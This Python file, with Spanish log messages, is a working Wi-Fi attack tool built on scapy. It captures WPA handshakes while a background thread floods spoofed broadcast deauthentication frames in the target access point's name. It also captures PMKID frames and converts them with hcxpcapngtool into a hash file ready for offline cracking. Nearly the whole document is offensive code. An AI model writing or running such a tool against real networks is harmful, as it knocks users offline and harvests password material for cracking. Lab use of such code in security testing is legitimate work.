from scapy.all import (sniff, wrpcap, Dot11, EAPOL, sendp, RadioTap, Dot11Deauth)
import shutil
import subprocess
import threading
import os


def _tool_available(name):
    return shutil.which(name) is not None

def _set_channel(interface, channel):
    try:
        r = subprocess.run(['iw', 'dev', interface, 'set', 'channel', str(channel)],
                           capture_output=True, text=True, timeout=15)
        return r.returncode == 0
    except Exception:
        return False


class HandshakeCapture:
    def __init__(self, bssid):
        self.bssid = bssid.lower()
        self.packets = []
        self.eapol_count = 0
        self._seen = set()

    def _packet_handler(self, pkt):
        if not (pkt.haslayer(EAPOL) and pkt.haslayer(Dot11)):
            return
        dot11 = pkt[Dot11]
        a1, a2, a3 = (dot11.addr1 or '').lower(), (dot11.addr2 or '').lower(), (dot11.addr3 or '').lower()
        
        if a3 != self.bssid and a1 != self.bssid:
            return
        try:
            key = (a1, a2, len(bytes(pkt[EAPOL])))
        except Exception:
            key = (a1, a2, id(pkt))
        if key in self._seen:
            return
        self._seen.add(key)
        self.packets.append(pkt)
        self.eapol_count += 1
        print(f"[+] EAPOL capturado ({self.eapol_count}/4)")

    def _deauth_loop(self, interface, interval, stop_event):
        pkt = (RadioTap() / Dot11(addr1='ff:ff:ff:ff:ff:ff',
                                  addr2=self.bssid, addr3=self.bssid)
               / Dot11Deauth(reason=7))
        while not stop_event.is_set():
            try:
                sendp(pkt, iface=interface, count=3, inter=0.05, verbose=False)
            except Exception:
                pass
            stop_event.wait(interval)

    def capture(self, interface, timeout=60, deauth_every=5, output='handshake.pcap'):
        print(f"[*] Capturando handshake para {self.bssid} en {interface}...")
        stop_event = threading.Event()
        deauth_thread = None
        if deauth_every and deauth_every > 0:
            deauth_thread = threading.Thread(
                target=self._deauth_loop, args=(interface, deauth_every, stop_event), daemon=True)
            deauth_thread.start()

        try:
            sniff(iface=interface, prn=self._packet_handler, timeout=timeout,
                  store=0, stop_filter=lambda p: self.eapol_count >= 4)
        except Exception as e:
            print(f"[!] Error durante la captura: {e}")
        finally:
            stop_event.set()
            if deauth_thread: deauth_thread.join(timeout=2)

        if self.packets:
            wrpcap(output, self.packets)
            print(f"[+] Handshake guardado en {output}")
            return output
        print("[-] No se capturó ningún handshake.")
        return None


def capture_pmkid(interface, bssid, channel, timeout=60, output='pmkid.pcap'):
    bssid = bssid.lower()

    if not _tool_available('hcxpcapngtool'):
        print("[!] hcxpcapngtool no encontrado. Instala 'hcxtools'.")

    if not _set_channel(interface, channel):
        print(f"[!] No se pudo fijar canal {channel} en {interface}.")
        return None

    print(f"[*] Capturando PMKID para {bssid} en canal {channel}...")

    packets = []
    def handler(pkt):
        if not (pkt.haslayer(EAPOL) and pkt.haslayer(Dot11)): return
        a3 = (pkt[Dot11].addr3 or '').lower()
        a1 = (pkt[Dot11].addr1 or '').lower()
        if a3 == bssid or a1 == bssid:
            packets.append(pkt)

    try:
        sniff(iface=interface, prn=handler, timeout=timeout, store=0)
    except Exception as e:
        print(f"[!] Error durante la captura PMKID: {e}")
        return None

    if not packets:
        print("[-] No se capturó PMKID.")
        return None

    wrpcap(output, packets)
    
    # FIX: Manejar cualquier extensión correctamente
    base, _ = os.path.splitext(output)
    hash_file = base + '.16800'
    
    if _tool_available('hcxpcapngtool'):
        subprocess.run(['hcxpcapngtool', '-o', hash_file, output], capture_output=True)

    if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
        print(f"[+] Hash PMKID extraído: {hash_file}")
        return hash_file
    print(f"[!] Capturado en {output} pero no se pudo extraer el hash.")
    return output
